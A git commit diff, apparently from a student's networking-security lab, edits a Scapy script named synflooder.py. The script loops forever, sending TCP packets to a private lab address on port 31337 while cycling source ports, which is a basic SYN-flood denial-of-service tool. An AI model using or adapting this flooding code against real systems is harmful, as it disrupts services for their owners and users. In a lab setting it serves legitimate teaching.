0ada6588ba55459ea2f8915b4871c23e6a2f5b46
Anjali Menon <anjmenon@MacBook-Pro.local>
2019-02-17 03:10:59 -0600

    Basic

--- Lab4/synflooder.py
+++ Lab4/synflooder.py
@@ -4,8 +4,8 @@ src_port = 1024
 while 1:
     dst_ip = "192.168.200.62"
     dst_port = 31337
-    my_packet = IP(dst=dst_ip)/TCP(dport=dst_port, sport = seq_no)/"anjalim3"
+    my_packet = IP(dst=dst_ip)/TCP(dport=dst_port, sport = src_port)/"anjalim3"
     send(my_packet)
-    seq_no = seq_no + 1
-    if seq_no > 49151:
-        seq_no = 1024
+    src_port = src_port + 1
+    if src_port > 49151:
+        src_port = 1024
